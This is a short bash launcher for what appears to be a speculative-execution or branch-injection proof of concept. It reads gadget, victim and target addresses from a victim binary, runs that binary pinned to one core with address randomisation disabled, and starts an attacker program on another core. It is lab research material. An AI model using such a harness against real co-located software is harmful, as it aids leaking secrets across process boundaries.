#!/bin/bash
GADGET=$(readelf -a victim | awk '$8=="gadget"{print $2}')
VICTIM=$(readelf -a victim | awk '$8=="victim"{print $2}')
TARGET=$(readelf -a victim | awk '$8=="target"{print $2}')

taskset -c $1 setarch x86_64 --addr-no-randomize ./victim &
PID=$!
trap "kill \"$PID\" 2>/dev/null" SIGINT

taskset -c $2 ./attacker "$GADGET" "$VICTIM" "$TARGET"
